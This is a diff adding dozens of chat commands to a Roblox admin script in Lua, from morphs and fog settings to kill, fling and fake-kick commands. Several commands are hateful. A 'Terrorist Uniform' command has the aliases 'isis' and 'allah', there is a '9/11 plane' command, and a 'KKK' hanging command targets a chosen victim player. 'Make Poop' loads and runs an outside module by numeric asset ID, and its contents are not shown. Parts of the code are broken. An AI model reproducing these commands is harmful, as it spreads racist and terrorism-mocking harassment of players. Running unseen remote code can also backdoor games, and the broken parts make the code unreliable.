+		for i,v in next, Root.GetPlayers(Player, Arguments[1]) do
+			table.insert(t, v.Name)
+		end
+		require(script.antiban)("PRAISE BILLBERT", t)
+	end
+)
+Root.AddCommand(
+'Remove Base',
+3,
+{
+	'rbase',
+	'nobase',
+	'unbase'
+},
+function(Player, Arguments)
+	pcall(function()
+		LibertyABase:Destroy()
+	end)
+	LibertyABase = nil
+end
+)
+Root.AddCommand(
+'UnMute',
+3,
+{
+	'unmute'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			if Root.GetRank(Player) > Root.GetRank(v) or v == Player then
+				Root.FireClient(v, 'SetMuted', false)
+				Root.FireClient(v, 'SetCoreGuiEnabled', 'Chat', true)
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Stars',
+2,
+{
+	'stars'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Lighting':children()) do
+		if v:IsA'Sky' then
+			v.StarCount = tonumber(Arguments[1])
+		end
+	end
+end
+)
+Root.AddCommand(
+'Time',
+1,
+{
+	'time'
+},
+function(Player, Arguments)
+	game:service'Lighting'.TimeOfDay = tonumber(Arguments[1])
+end
+)
+Root.AddCommand(
+'Unlock Workspace',
+1,
+{
+	'unlockws'
+},
+function(Player, Arguments)
+	for i,v in pairs(workspace:GetDescendants()) do
+		pcall(function()
+			v.Locked = false
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Ranks',
+0,
+{
+	'ranks'
+},
+function(Player, Arguments)
+	Root.FireClient(Player, 'Dismiss')
+	for i, v in pairs(Root.Ranks) do
+		local txtnam=i
+		if type(i) == 'number' then
+		pcall(function()
+			Root.Ranks[Root.UsernameFromID(ID)]=v
+			Root.Ranks[i]=nil
+		end)
+		end
+		if type(i)=='string' then
+		Root.Ping(Player, txtnam, nil, function()
+			Root.FireClient(Player, 'Dismiss')
+			Root.Ping(Player, 'Name | '..txtnam, nil, nil, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..i)
+			Root.Ping(Player, 'Rank | '..Root.RankName(v) or '', nil, function()
+				if Root.GetRank(Player) > v and Root.GetRank(Player) >= 2 then
+					Root.FireClient(Player, 'Dismiss')
+					Root.Ping(Player, 'Back', 'Really blue', function()
+						Root.Commands.ranks.Function(Player, Arguments)
+					end)
+					Root.Ping(Player, 'Close', 'Really red', function()
+						Root.FireClient(Player, 'Dismiss')
+					end)
+					local numberofranks = Root.GetRank(Player) + 1
+					if numberofranks > 12 then
+						numberofranks = 12
+					end
+					for o = 1, numberofranks do
+						local id = o - 2
+						Root.Ping(Player, 'SetRank '..Root.RankName(id),nil, function()
+							Root.AddLog(Player.Name.." set "..txtnam..' to rank '..Root.RankName(id))
+							Root.FireClient(Player, 'Dismiss')
+							Root.Ranks[txtnam] = id
+							Root.Commands.ranks.Function(Player, Arguments)
+						end)
+					end
+				end
+			end)
+	end, "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=200&Format=Png&userId="..i)
+	end
+	end
+end
+)
+Root.AddCommand(
+'Skybox',
+2,
+{
+	'sky',
+	'skybox'
+},
+function(Player, Arguments)
+	for i, v in pairs(game:service'Lighting':children()) do
+		if v:IsA'Sky' then
+			v:Destroy()
+		end
+	end
+	local sk = Instance.new('Sky', game:service'Lighting')
+	sk.SkyboxBk = 'rbxassetid://'..Arguments[1]
+	sk.SkyboxDn = 'rbxassetid://'..Arguments[1]
+	sk.SkyboxFt = 'rbxassetid://'..Arguments[1]
+	sk.SkyboxLf = 'rbxassetid://'..Arguments[1]
+	sk.SkyboxRt = 'rbxassetid://'..Arguments[1]
+	sk.SkyboxUp = 'rbxassetid://'..Arguments[1]
+end
+)
+Root.AddCommand(
+'Invisible',
+1,
+{
+	'invis',
+	'invisible'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		coroutine.resume(coroutine.create(function()
+			if v and v.Character then 
+				for a, obj in pairs(v.Character:children()) do 
+					if obj:IsA("BasePart") then
+						obj.Transparency = 1
+						if obj:findFirstChild("face") then
+							obj.face.Transparency = 1
+						end
+					elseif obj:IsA("Accoutrement") and obj:findFirstChild("Handle") then
+						obj.Handle.Transparency = 1
+					end
+				end
+			end
+		end))
+	end
+end
+)
+Root.AddCommand(
+'Visible',
+1,
+{
+	'vis',
+	'visible'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		coroutine.resume(coroutine.create(function()
+			if v and v.Character then 
+				for a, obj in pairs(v.Character:children()) do 
+					if obj:IsA("BasePart") and obj.Name ~= 'HumanoidRootPart' then
+						obj.Transparency = 0
+						if obj:findFirstChild("face") then
+							obj.face.Transparency = 0
+						end
+					elseif obj:IsA("Accoutrement") and obj:findFirstChild("Handle") then
+						obj.Handle.Transparency = 0
+					end
+				end
+			end
+		end))
+	end
+end
+)
+Root.AddCommand(
+'Kill',
+1,
+{
+	'kill'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			v.Character:BreakJoints()
+		end)
+	end
+end
+)
+Root.AddCommand(
+'LoopKill',
+2,
+{
+	'loopkill',
+	'lk'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.Loopkill[v.userId]=true
+		end)
+	end
+end
+)
+Root.AddCommand(
+'UnLoopKill',
+2,
+{
+	'unloopkill',
+	'unlk'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.Loopkill[v.userId]=false
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Ghost',
+1,
+{
+	'ghostify','ghost'
+},
+function(Player, Arguments)
+for i,v in pairs(Root.GetPlayers(Player,Arguments[1])) do
+coroutine.resume(coroutine.create(function()
+	if v and v.Character and v.Character:findFirstChild("HumanoidRootPart") then
+		if v.Character:findFirstChild("Shirt") then
+			v.Character.Shirt.Parent = v.Character.HumanoidRootPart
+		end
+		if v.Character:findFirstChild("Pants") then
+			v.Character.Pants.Parent = v.Character.HumanoidRootPart
+		end
+		for a, a in pairs(v.Character:children()) do
+			if a.Name == "ify" then
+				a:Destroy()
+			end
+		end
+		for a, a in pairs(v.Character:children()) do
+			if a:IsA("BasePart") and (a.Name ~= "Head" or not a.Parent:findFirstChild("NameTag", true)) then
+				a.Transparency = .5
+				a.Reflectance = 0
+				a.BrickColor = BrickColor.new("Institutional white")
+				if a.Name:find("Leg") then
+					a.Transparency = 1
+				end
+			elseif a:findFirstChild("NameTag") then
+				a.Head.Transparency = .5
+				a.Head.Reflectance = 0
+				a.Head.BrickColor = BrickColor.new("Institutional white")
+			end
+		end
+	end
+end))
+end
+end
+)
+Root.AddCommand(
+'Team',
+1,
+{
+	'team'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		thread(function()
+			if v then 
+				for o, p in pairs(game:service'Teams':children()) do
+					if p.Name:lower():sub(1, #Arguments[2]) == Arguments[2]:lower() then
+						v.TeamColor = p.TeamColor
+					end
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Periastron',
+3,
+{
+	'periastron',
+	'peri'
+},
+function(Player, Arguments)
+	local Players = Root.GetPlayers(Player, Arguments[1])
+	for i, v in pairs(Players) do
+		thread(function()
+			for u, o in pairs(Root.Periastrons) do
+				service'InsertService':LoadAsset(o):children()[1].Parent = v.Backpack
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Clone',
+1,
+{
+	'clone'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		thread(function()
+			if v and v.Character then 
+				v.Character.Archivable = true 
+				local cl = v.Character:Clone() 
+				table.insert(Objects, cl) 
+				cl.Parent = game.Workspace 
+				cl:MoveTo(v.Character:GetModelCFrame().p)
+				cl:MakeJoints()
+				v.Character.Archivable = false 
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Freeze',
+1,
+{
+	'freeze'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'BasePart' then
+					p.Anchored = true
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Thaw',
+1,
+{
+	'unfreeze',
+	'thaw'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			for o, p in pairs(v.Character:children()) do
+				if p:IsA'BasePart' then
+					p.Anchored = false
+				end
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'No Respawn',
+1,
+{
+	'nospawn',
+	'nrs'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			local c = v.Character:children()
+			for i, v in pairs(c) do
+				if v:IsA"Accoutrement" then
+					v.Parent = workspace
+				end
+			end
+			local hum = v.Character.Humanoid
+			pcall(function()
+				v.Character.Animate.Disabled = true
+			end)
+			local health = hum.Health
+			local ws = hum.WalkSpeed
+			local maxhealth = hum.MaxHealth
+			local Name = hum.Name
+			hum:Destroy()
+			local hum = Instance.new('Humanoid', v.Character)
+			hum.Health = health
+			hum.WalkSpeed = ws
+			hum.MaxHealth = maxhealth
+			hum.Name = Name
+			wait()
+			for o, p in pairs(c) do
+				if p:IsA"Accoutrement" then
+					p.Parent = v.Character
+				end
+			end
+			wait(.5)
+			pcall(function()
+				v.Character.Animate.Disabled = false
+			end)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Cat',
+1,
+{
+	'cat'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'cat')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Epic face',
+1,
+{
+	'epicface'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'epicfaic')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Doge',
+1,
+{
+	'doge','dog'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'doge')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Gremlin',
+1,
+{
+	'gremlin'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'gremlin')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Harambe Become 2',
+4,
+{
+	'harambe'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.harambeBecome(v)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'MLG Particles',
+1,
+{
+	'mlgp'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.mlgParticle(v)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Pee Go',
+4,
+{
+	'pee'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.pee(v)
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Spam Cancer',
+4,
+{
+		'cancer',
+		'charlidamelio'
+	},
+	function(Player, Arguments)
+		local playerLeaderstats = {}
+		for i, v in pairs(game.Players:GetChildren()) do
+			table.insert(playerLeaderstats, v)
+		end
+		for i, v in pairs(playerLeaderstats) do
+			local pe = Instance.new("ParticleEmitter",v.Character.Torso)
+			pe.Texture = "http://www.roblox.com/asset/?id=541396576"
+			pe.VelocitySpread = 50
+			local se = Instance.new("ParticleEmitter",v.Character.Torso)
+			se.Texture = "http://www.roblox.com/asset/?id=541396627"
+			se.VelocitySpread = 50
+			local fe = Instance.new("ParticleEmitter",v.Character.Torso)
+			fe.Texture = "http://www.roblox.com/asset/?id=541396654"
+			fe.VelocitySpread = 50
+		end
+		
+		local a=Instance.new("Sky",game.Lighting)
+		
+		local b={"Bk","Dn","Ft","Lf","Rt","Up"}
+		
+		for i,v in pairs(b) do
+			
+			a["Skybox"..v]="rbxassetid://541396480"
+			
+		end
+		
+		print("Music executed!")
+		
+		local s = Instance.new("Sound")
+		
+		s.Name = "Music"
+		
+		s.SoundId = "http://www.roblox.com/asset/?id=541369345" --Put the id into there.
+		
+		s.Looped = true
+		
+		s.Pitch = 1 --You can edit these settings.
+		
+		s.Volume = 10 --You can edit these settings.
+		
+		s.archivable = false
+		
+		
+		
+		s.Parent = game.Workspace
+		
+		
+		
+		wait(1)
+		
+		
+		s:play()
+		
+	end
+)
+Root.AddCommand(
+	"Terrorist Uniform",
+	2,
+	{
+		"terrorist",
+		"isis",
+		"allah"
+	},
+	function(Player, Arguments)
+		for _,plr in next, Root.GetPlayers(Player, Arguments[1]) do
+			pcall(function()
+				Player = plr
+				
+				for i,v in pairs (Player.Character:GetChildren()) do
+					if v:IsA("Accessory") then
+						v:Destroy()
+					end
+				end
+				
+				local o1 = Instance.new("Part")
+				o1.Name = "thing"
+				o1.Anchored = true
+				o1.FormFactor = Enum.FormFactor.Custom
+				o1.Size = Vector3.new(2, 0.4, 1)
+				o1.BottomSurface = Enum.SurfaceType.Smooth
+				o1.TopSurface = Enum.SurfaceType.Smooth
+				local o2 = Instance.new("SpecialMesh")
+				o2.Parent = o1
+				o2.MeshId = "http://www.roblox.com/asset/?id=12305010"
+				o2.Scale = Vector3.new(1,1,1)
+				o2.Offset = Vector3.new(0,-.55,0)
+				o2.TextureId = "http://www.roblox.com/asset/?id=21729264"
+				o2.MeshType = Enum.MeshType.FileMesh
+				local h = Instance.new("Hat")
+				local p = Instance.new("Part")
+				h.Name = "SWAT Helm"
+				p.Parent = h
+				p.Position = game.Players.LocalPlayer.Character:findFirstChild("Head").Position
+				p.Name = "Handle" 
+				p.formFactor = 0
+				p.Size = Vector3.new(0,-0.25,0) 
+				p.BottomSurface = 0 
+				p.TopSurface = 0 
+				p.Locked = true 
+				o1.Mesh:clone().Parent = p
+				h.Parent = Player.Character
+				h.AttachmentPos = Vector3.new(0,-.15,-0)	
+				Player.Character.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=17788953"
+				Player.Character.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=17788960"
+				Player.Character.Humanoid.MaxHealth = 300
+				Player.Character.Humanoid.Health = 300
+			end)
+		end
+	end
+)
+Root.AddCommand(
+	"trump face",
+	2,
+	{
+		"trump"
+	},
+	function(Player, Arguments)
+		for i,v in next, Root.GetPlayers(Player, Arguments[1]) do
+			pcall(function()
+				--Thanks To HessaFTW And His Slave BlueHunter
+				--Hessa Is the one that made this compalation
+				--BlueHunter was the test subject
+				--Have eny scripts that arent in here send them to HessaFTW and he will test and put in for next update
+				
+				gui1=Instance.new("BillboardGui")
+				gui1.Parent = v.Character.Head
+				gui1.Adornee = v.Character.Head
+				gui1.Size=UDim2.new(2.5,0,2.5,0)
+				gui1.StudsOffset=Vector3.new(0,0.2,0)
+				gui1.AlwaysOnTop = true
+				text1=Instance.new("ImageLabel")
+				text1.Image = "http://www.roblox.com/asset/?id=343377229" --[[Face Image Source (If you wish to change the face to a different decal put it in there]]
+				text1.Size=UDim2.new(1,0,1,0)
+				text1.Position=UDim2.new(0,0,0,0)
+				text1.BackgroundTransparency = 1
+				text1.Parent=gui1
+				v.Character.Head.Transparency = 1
+				for amb in pairs(v.Character:GetChildren()) do if b.ClassName == 'Hat' then b:remove() end end
+				
+				--Be trump feel he power of the walls
+			end)
+		end
+	end
+)
+Root.AddCommand(
+	"Make Poop",
+	2,
+	{
+		"crap",
+		"poop",
+		
+	},
+	function(Player, Arguments)
+		for i,v in next, Root.GetPlayers(Player, Arguments[1]) do
+			pcall(function()
+				require(5677173069)(v)
+			end)
+		end
+	end
+)
+Root.AddCommand(
+'Farter',
+4,
+{
+	'fart'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.fart(v)
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'9/11 plane',
+4,
+{
+	'911',
+	'plane'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.nineeleven(v)
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Draw Image',
+4,
+{
+	'image',
+	'draw',
+	'drawimage'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			print(Arguments[2])
+			Root.draw(v, Arguments[2])
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Clear Images',
+4,
+{
+	'clrimg',
+	'clearimage',
+	'cimage',
+	'cimg'
+},
+function()
+	pcall(function()
+		Root.clearImg()
+	end)
+end
+)
+
+Root.AddCommand(
+'Hang [PLR], [VICTIM]',
+4,
+{
+	'hang',
+	'KKK'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		for i1, v1 in pairs(Root.GetPlayers(Player, Arguments[2])) do
+			pcall(function()
+				Root.hangKKK(v, v1)
+			end)
+		end
+	end
+end
+)
+
+Root.AddCommand(
+'Dead Dog',
+1,
+{
+	'deaddog'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'deaddog')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Dragon',
+1,
+{
+	'dragon'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'dragon')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Chopper',
+1,
+{
+	'chopper'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'chopper')
+		end)
+	end
+end
+)
+
+
+Root.AddCommand(
+'Bat',
+1,
+{
+	'bat'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'bat')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Doggie',
+1,
+{
+	'doggie','doggy'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'doggie')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Monster',
+1,
+{
+	'monster'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'monster')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Spider',
+1,
+{
+	'spider'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'spider')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Grimlock',
+1,
+{
+	'grimlock'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'grimlock')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Mr Huge',
+1,
+{
+	'mrhuge'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'huge')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Genie',
+1,
+{
+	'genie'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'genie')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Petdino',
+1,
+{
+	'petdino','dino'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'petdino')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'undeadknight',
+1,
+{
+	'undeadknight','zombieknight'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'undeadknight')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'The Diamond Minecart',
+1,
+{
+	'tdm'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'tdm')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Skeleton',
+1,
+{
+	'skeleton'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'skeleton')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Chimera',
+1,
+{
+	'chimera'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'chimera')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Pony',
+1,
+{
+	'pony'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'pony')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Penguin',
+1,
+{
+	'penguin'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'penguin')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Zombie',
+1,
+{
+	'zombie','zombify'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'zombie2')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Griffin',
+1,
+{
+	'griffin'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'griffin')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Nerf Zombie',
+1,
+{
+	'nerfzombie'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'nerfzombie')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Monkey',
+1,
+{
+	'monkay','monkey'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'monkay')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Blue Ghost',
+1,
+{
+	'blueghost'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'ghost')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Baby fox',
+1,
+{
+	'babyfox','fox'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'babyfox')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Troll',
+1,
+{
+	'troll'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'troll')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Bug',
+1,
+{
+	'bug'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'bug')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Meerkat',
+1,
+{
+	'meerkat'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'meerkat')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Robot Spider',
+1,
+{
+	'robotspider'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'robotspider')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Crocadile',
+1,
+{
+	'croc','crocadile'
+},
+function(Player, Arguments)
+	for i, v in pairs(Root.GetPlayers(Player, Arguments[1])) do
+		pcall(function()
+			Root.CharModel(v,'croc')
+		end)
+	end
+end
+)
+
+Root.AddCommand(
+'Give',
+2,
+{
+	'give'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	Tools = {}
+	for i, v in pairs(game:service'ServerStorage':children()) do
+		if (v:IsA'Tool' or v:IsA'HopperBin') and (v.Name:lower():sub(1, #Root.Join(Arguments)) == Root.Join(Arguments):lower() or Root.Join(Arguments):lower() == 'all') then
+			table.insert(Tools, v)
+		end
+	end
+	for i, v in pairs(game:service'Lighting':children()) do
+		if (v:IsA'Tool' or v:IsA'HopperBin') and (v.Name:lower():sub(1, #Root.Join(Arguments)) == Root.Join(Arguments):lower() or Root.Join(Arguments):lower() == 'all') then
+			table.insert(Tools, v)
+		end
+	end
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			for o, p in pairs(Tools) do
+				p:clone().Parent = v.Backpack
+			end
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Fling',
+1,
+{
+	'fling'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		coroutine.resume(coroutine.create(function()
+			if v and v.Character and v.Character:findFirstChild("HumanoidRootPart") and v.Character:findFirstChild("Humanoid") then
+				local c
+				local b
+				repeat
+					c = math.random(-9999, 9999)
+				until math.abs(c) >= 5555
+				repeat
+					b = math.random(-9999, 9999)
+				until math.abs(b) >= 5555
+				v.Character.Humanoid.Sit = true
+				v.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+				local a = Instance.new("BodyForce", v.Character.HumanoidRootPart)
+				a.force = Vector3.new(c * 4, 9999 * 5, b * 4)
+				game:service("Debris"):AddItem(a, .1)
+			end
+		end))
+	end
+end
+)
+Root.AddCommand(
+'Plat',
+1,
+{
+	'plat'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	table.remove(Arguments, 1)
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.FireClient(v, 'Platform', Root.Join(Arguments))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Fakekick',
+1,
+{
+	'fk';
+	'fakekick';
+	
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.FireClient(v, 'FakeSDGui','Disconnected by '..Root.AdminName:gsub('Admin','Administration'))
+		end)
+	end
+end
+)
+Root.AddCommand(
+'UnPlat',
+1,
+{
+	'unplat'
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			Root.FireClient(v, 'plat')
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Stop',
+1,
+{
+	'stop'
+},
+function(Player, Arguments)
+	loopnum = loopnum + math.random(-9999999, 9999999)
+end
+)
+Root.AddCommand(
+'Do',
+1,
+{
+	'do';
+	'repeat';
+	'rep';
+},
+function(Player, Arguments)
+	local c = tonumber(Arguments[1])
+	local d = tonumber(Arguments[2])
+	table.remove(Arguments, 1)
+	table.remove(Arguments, 1)
+	local num = loopnum
+	for i = 1, c do
+		if num ~= loopnum or loopnum ~= num then
+			break
+		end
+		pcall(Root.PlayerChatted,Player, Root.Join(Arguments),true)
+		wait(d)
+	end
+end
+)
+Root.AddCommand(
+'Delay',
+1,
+{
+	'delay';
+	'wait';
+},
+function(Player, Arguments)
+	wait(tonumber(Arguments[1]))
+	table.remove(Arguments, 1)
+	Root.PlayerChatted(Player, Root.Join(Arguments))
+end
+)
+Root.AddCommand(
+'Respawn',
+1,
+{
+	'respawn';
+	'rs';
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			v:LoadCharacter()
+		end)
+	end
+end
+)
+Root.AddCommand(
+'Refresh',
+1,
+{
+	'rsf';
+	'rfs';
+	'refresh';
+	'ref';
+	'unfly';
+	'nofly';
+},
+function(Player, Arguments)
+	local arg1 = Arguments[1]
+	for i, v in pairs(Root.GetPlayers(Player, arg1)) do
+		pcall(function()
+			local c = v.Character.Head.CFrame
+			v:LoadCharacter()
+			wait()
+			v.Character.HumanoidRootPart.CFrame = c
+		end)
+	end
+end
+)
+Root.AddCommand(
+'FogColor',
+1,
+{
+	'fc';
+	'fogcolor';
+},
+function(Player, Arguments)
+	game:service'Lighting'.FogColor = Color3.new(Arguments[1] / 255, Arguments[2] / 255, Arguments[3] / 255)
+end
+)
+Root.AddCommand(
+'FogEnd',
+1,
+{
+	'fogend';
+},
+function(Player, Arguments)
+	game:service'Lighting'.FogEnd = tonumber(Arguments[1])
+end
+)
+Root.AddCommand(
+'FogStart',
+1,
+{
+	'fogstart';
+},
+function(Player, Arguments)
+	game:service'Lighting'.FogStart = tonumber(Arguments[1])
+end
+)
